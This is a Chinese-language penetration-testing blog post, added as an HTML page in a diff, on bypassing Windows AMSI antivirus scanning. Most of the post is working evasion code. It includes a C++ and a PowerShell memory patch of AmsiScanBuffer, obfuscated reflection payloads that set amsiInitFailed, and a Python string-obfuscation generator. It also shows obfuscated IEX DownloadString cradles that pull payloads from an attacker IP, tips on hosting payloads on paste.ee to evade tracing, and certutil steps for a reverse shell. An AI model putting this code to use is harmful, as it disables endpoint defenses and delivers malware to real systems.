@@ -1,0 +1,415 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>AMSI绕过 | pyroxenite</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://pyroxenites.github.io">
+        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://pyroxenites.github.io">
+        <h1 class="site-title">pyroxenite</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">AMSI绕过</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-04-22</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://pyroxenites.github.io/tag/lOr-AdJnN/">
+                    内网渗透
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <blockquote>
+<p>powershell无文件特性,在实战中还是比较好用的</p>
+</blockquote>
+<p>AMSI 允许服务和应用程序与已安装的反恶意软件进行通信。当系统中开始创建进程或者被申请内存，AMSI 就会处于挂钩状态，例如，Windows 脚本主机(WSH) 和PowerShell，以便对正在执行的内容进行去混淆处理和分析。此内容在执行之前被“捕获”并发送到反恶意软件解决方案。</p>
+<blockquote>
+<p><a href="https://github.com/PKRoma/ProcessHacker">https://github.com/PKRoma/ProcessHacker</a></p>
+</blockquote>
+<p>观察<br>
+这里可以用Process Monitor观察一下<br>
+过滤规则如下</p>
+<p><img src="https://pyroxenites.github.io/post-images/1648259213131-d487ac43-a5ff-4e19-85bc-d88c5dc32ade.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648255519750-a0721b17-0914-4f77-83f9-77849c08f275.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1648259656040-7e9550df-1998-4896-a062-81162525e6b9.png" alt="火绒剑效果" loading="lazy"><br>
+我们会发现当我们启动powershell的时候,便加载了amsi.dll</p>
+<p>amsi本质上是一个dll,故它具有其导出函数<br>
+<img src="https://pyroxenites.github.io/post-images/1648259575456-da2a2beb-d239-4279-9301-a2a8ba5589b7.png" alt="image.png" loading="lazy"></p>
+<h2 id="手动检测">手动检测</h2>
+<ol>
+<li>调试器附加并定位AmsiScanBuffer函数</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1648258778306-9ee76b87-eb39-45c3-adfd-720c1679ee1a.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>修补该函数让其直接返回</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1648258832434-154bcca0-7b66-4333-9441-b27424306444.png" alt="image.png" loading="lazy"></figure>
+<h3 id="windows-defender为例">windows defender为例</h3>
+<p>在腾讯云windows自带的windows def</p>
+<blockquote>
+<p>字符串是否敏感是由amsi.dll中的AmsiScanBuffer函数来进行判断的<br>
+AmsiScanBuffer函数应该返回HRESULT类型值，这是一个整数值，用来表示操作是否成功</p>
+</blockquote>
+<blockquote>
+<p>在函数执行过程中，待分析的内容会被发送到反恶意软件服务，后者会返回1到32762（含）之间的一个整数。整数值越大，则代表风险越高。如果证书大于或等于32762，那么就会将其判断为恶意数据，加以阻止。随后系统会根据返回的整数值来更新AMSI_RESULT变量值。</p>
+</blockquote>
+<p>故可以看出amsi使用&quot;基于字符串&quot;的检测方式</p>
+<ol>
+<li>使用replace去替换字符串内容</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1648255689917-49c79dae-b139-4f6e-a792-ab1f420a89f4.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>字符串断点+拼接</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1648255929288-97036414-b4e2-4297-a8ef-430e667a0d30.png" alt="image.png" loading="lazy"></figure>
+<ol start="3">
+<li>剩下可以通过编码方式</li>
+</ol>
+<ul>
+<li>base64</li>
+<li>XOR</li>
+<li>HEX</li>
+</ul>
+<h2 id="内存补丁绕过技术">内存补丁绕过技术</h2>
+<ul>
+<li>创建一个powershell进程</li>
+<li>获取amsiscanbuffer函数地址</li>
+<li>修改函数内存空间属性</li>
+<li>修补函数执行体</li>
+</ul>
+<pre><code class="language-cpp">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+    
+    CreateProcessA(NULL, (LPSTR)&quot;powershell -NoExit dir&quot;, NULL, NULL, NULL, NULL, NULL, NULL, &amp;si, &amp;pi);
+    
+    HMODULE hAmsi = LoadLibraryA(&quot;amsi.dll&quot;);
+    LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, &quot;AmsiScanBuffer&quot;);
+    
+    Sleep(500);
+    
+    DWORD oldProtect;
+    char patch = 0xc3;
+    
+    VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
+    WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &amp;patch, sizeof(char),NULL);
+    VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    FreeLibrary(hAmsi);
+    return 0;
+}
+</code></pre>
+<p>powershell脚本如下：</p>
+<pre><code class="language-powershell">$Win32 = @&quot;
+ 
+using System;
+using System.Runtime.InteropServices;
+ 
+public class Win32 {
+ 
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+ 
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr LoadLibrary(string name);
+ 
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+ 
+}
+&quot;@
+ 
+Add-Type $Win32
+ 
+$LoadLibrary = [Win32]::LoadLibrary(&quot;am&quot; + &quot;si.dll&quot;)
+$Address = [Win32]::GetProcAddress($LoadLibrary, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;)
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]0)
+$Patch = [Byte[]] (0xc3, 0x90, 0x90)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1648273726812-4e45347f-d2c8-406c-9a1c-7f30fc9e8cb9.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>前提是要保证程序或者脚本不被查杀,否则起不到修补作用</p>
+</blockquote>
+<ol>
+<li>使用CS生成一个ps1脚本</li>
+</ol>
+<p><img src="https://pyroxenites.github.io/post-images/1648275905921-01541b6b-9b57-4669-810b-5633c325b252.png" alt="image.png" loading="lazy"><br>
+将其bases64编码</p>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1648274934892-1b7ffc63-9e63-4189-886b-6a2841476d23.png" alt="image.png" loading="lazy"></figure>
+<pre><code class="language-cpp">$Encryption = @'   '@.Replace('xxx','') 
+##Encryption可以多用replace进行替换混淆
+
+$Decryption = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Encryption))
+
+</code></pre>
+<p>将修补代码加到IEX之前,从而破坏AMSI</p>
+<p><img src="https://pyroxenites.github.io/post-images/1648276635615-3556eeea-2bee-4b80-a78a-13c8d5832e3a.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648276814488-40d00fe1-7e92-4c9d-98ce-f7317a1f4676.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1648277063817-60c8ad8a-d4a3-4fdd-86c5-d2b1cba3e4a6.png" alt="image.png" loading="lazy"><br>
+<a href="https://paste.ee/"><br>
+</a></p>
+<blockquote>
+<p>将样本托管GitHub，虽然虽不会被防病毒标记，但是在实战攻防中非常容易就被蓝队溯源出个人信息,这边推荐一个可以在公网上挂起文本并且合法的网站<a href="https://paste.ee/">https://paste.ee/</a>,也可以创建一个github小号进行利用</p>
+</blockquote>
+<pre><code class="language-powershell">IEX([Net.Webclient]::new().DownloadString(&quot;h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t&quot;.Replace('@@@@@','').Replace('%%%','')))
+IEX ((new-object net.webclient).downloadstring(&quot;ht@@@@@tp://1@@@@@0@!#$%^&amp;*()1.3@@@@@9.xx.xx8:7@!#$%^&amp;*()77/tt**************s.tx**************t&quot;.Replace('@@@@@','').Replace('@!#$%^&amp;*()','').Replace('**************',''))
+
+
+
+
+$webreq = [System.Net.WebRequest]::Create(‘0.0.0.0/1.ps1’)
+$resp=$webreq.GetResponse()
+$respstream=$resp.GetResponseStream()
+$reader=[System.IO.StreamReader]::new($respstream)
+$content=$reader.ReadToEnd()
+IEX($content)
+
+</code></pre>
+<h2 id="amsi强制报错">AMSI强制报错</h2>
+<p>强制AMSI初始化失败(amsiInitFailed)将导致不会为当前进程启动扫描.目前微软已经开发了一个签名来防止更广泛的使用</p>
+<pre><code class="language-csharp">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+原理已经被很多文章分析: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-loggi
+ng-evasion/,具体的小伙伴可以阅读以上文章,简单的说就是利用反射直接把判断是否要使用杀毒软件
+进行扫描的变量始终改成false。这样AMSI就不会把我们的恶意脚本交给杀毒软件,而是直接返回
+AMSI_RESULT_NOT_DETECTED
+
+//混淆
+$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+    
+//另外一个混淆
+//System.Management.Automation.AmsiUtils和amsiInitFailed的编码数据
+$a=&quot;5492868772801748688168747280728187173688878280688776828&quot;
+$b=&quot;1173680867656877679866880867644817687416876797271&quot;
+//对System.Management.Automation.AmsiUtils进行解码
+$c=[string](0..37|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace &quot; &quot;
+$d=[Ref].Assembly.GetType($c)
+//对amsiInitFailed进行解码
+$e=[string](38..51|%{[char][int](29+($a+$b).substring(($_*2),2))})-replace &quot; &quot;
+$f=$d.GetField($e,'NonPublic,Static')
+//组合起来执行
+$f.SetValue($null,$true)
+</code></pre>
+<pre><code class="language-csharp">payload1='System.Management.Automation.AmsiUtils'
+payload2='amsiInitFailed'
+key=29 #偏差是多少 比如这里是29
+payload=payload1+payload2
+result=''
+for i in payload:
+    result+=str(ord(i)-key)#ASCII每个字符再减去key的值
+print('$a=&quot;'+result[0:len(result)//2]+'&quot;')#分割，这里对半分的。注意在这里面的除法需要两个/
+print('$b=&quot;'+result[len(result)//2:]+'&quot;')
+print('$c=[string](0..'+str(len(payload1)-1)+'|%{[char][int]('+str(key)+'+($a+$b).substring(($_*2),2))})-replace &quot; &quot;')#解码语句，应用到别的bypass场景或许也可以
+print(&quot;$d=[Ref].Assembly.GetType($c)&quot;)
+print('$e=[string]('+str(len(payload1))+&quot;..&quot;+str(len(payload1)+len(payload2)-1)+' |%{[char][int]('+str(key)+'+($a+$b).substring(($_ * 2), 2))})-replace&quot; &quot;') #关键解码语句
+
+print(&quot;$f=$d.GetField($e,'NonPublic,Static')&quot;)
+print(&quot;$f.SetValue($null,$true)&quot;)payload1='System.Management.Automation.AmsiUtils'
+payload2='amsiInitFailed'
+key=29 #偏差是多少 比如这里是29
+payload=payload1+payload2
+result=''
+for i in payload:
+result+=str(ord(i)-key)#ASCII每个字符再减去key的值
+print('$a=&quot;'+result[0:len(result)//2]+'&quot;')#分割，这里对半分的。注意在
+这里面的除法需要两个/
+print('$b=&quot;'+result[len(result)//2:]+'&quot;')
+print('$c=[string](0..'+str(len(payload1)-1)+'|%{[char][int]
+('+str(key)+'+($a+$b).substring(($_*2),2))})-replace &quot; &quot;')#解码语
+句，应用到别的bypass场景或许也可以
+print(&quot;$d=[Ref].Assembly.GetType($c)&quot;)
+print('$e=[string]
+('+str(len(payload1))+&quot;..&quot;+str(len(payload1)+len(payload2)-1)+'|%
+{[char][int]('+str(key)+'+($a+$b).substring(($_*2),2))})-replace
+&quot; &quot;')#关键解码语句
+print(&quot;$f=$d.GetField($e,'NonPublic,Static')&quot;)
+print(&quot;$f.SetValue($null,$true)&quot;)
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1648375222265-b2a6e129-b9fa-48ea-a0cf-e3936640609e.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648376416739-d69a6a76-cf0d-491b-b63c-fde467e6de0d.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648377008250-3267e7ad-9543-4289-9969-1d6d7228cf8a.png" alt="image.png" loading="lazy"><br>
+amsiContext分配内存区域,并且由于&quot;amsiSession&quot;设置为Null将导致错误</p>
+<pre><code class="language-csharp">$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null, $null);[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;,&quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem)
+//不免杀,因为Amsi标记了System.Management.Automation.AmsiUtils和amsiSession以及amsiContext字段,毕竟都带着amsi字眼
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1648380319845-da8d9b34-0752-49ed-84af-783afac5a8c2.png" alt="image.png" loading="lazy"><br>
+当然也要对其脚本进行混淆</p>
+<pre><code class="language-csharp">import sys
+
+def Cod(payload1,payload2,key):
+    payload=payload1+payload2
+    result=''
+    for i in payload:
+        result+=str(ord(i)-key)#ASCII每个字符再减去key的值
+    print('$a=&quot;'+result[0:len(result)//2]+'&quot;')#分割，这里对半分的。注意在这里面的除法需要两个/
+    print('$b=&quot;'+result[len(result)//2:]+'&quot;')
+    print('$c=[string](0..'+str(len(payload1)-1)+'|%{[char][int]('+str(key)+'+($a+$b).substring(($_*2),2))})-replace &quot; &quot;')#解码语句，应用到别的bypass场景或许也可以
+    print('$e=[string]('+str(len(payload1))+&quot;..&quot;+str(len(payload1)+len(payload2)-1)+' |%{[char][int]('+str(key)+'+($a+$b).substring(($_ * 2), 2))})-replace&quot; &quot;') #关键解码语句
+
+
+if __name__ == '__main__':
+    print(&quot;python main.py 混淆字符串1 混淆字符串2 偏移&quot;)
+    print(&quot;python main.py System.Management.Automation.AmsiUtils Amsisession 30&quot;)
+    if len(sys.argv)!=4:
+        print(&quot;请按照规定输入&quot;)
+        sys.exit(0)
+    Cod(sys.argv[1],sys.argv[2],int(sys.argv[3]))
+</code></pre>
+<h2 id="提醒">提醒</h2>
+<p>windows deference熟悉base64＋IEX套路,最好将其敏感字符串进行单独的编码</p>
+<p>上面是在powershell环境下免杀的<br>
+后发现在cmd下wd会监控<br>
+不过</p>
+<pre><code class="language-python">echo bases64命令 &gt; 1.txt
+certutil -f -decode 1.txt 1.ps1
+powershell -f 1.ps1
+</code></pre>
+<p>base64我使用的是powershell的套接字代码,反弹powershell环境<br>
+不过猜测直接上线也可以</p>
+<h2 id="实战">实战</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1650608387106-121ffb48-9beb-4326-831d-8bef1d7702a6.png" alt="382737acb06bebb98ff7c6f47e2e938.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1650608737666-d0e31b22-2128-45d6-b56f-8ade9483db3d.png" alt="image.png" loading="lazy"></p>
+<p>这里直接运用实战，发现可以直接绕过amsi的检测，成功上线</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://pyroxenites.github.io/post/shiro/">
+              <h3 class="post-title">
+                下一篇：shiro 理解以及payload限制长度
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
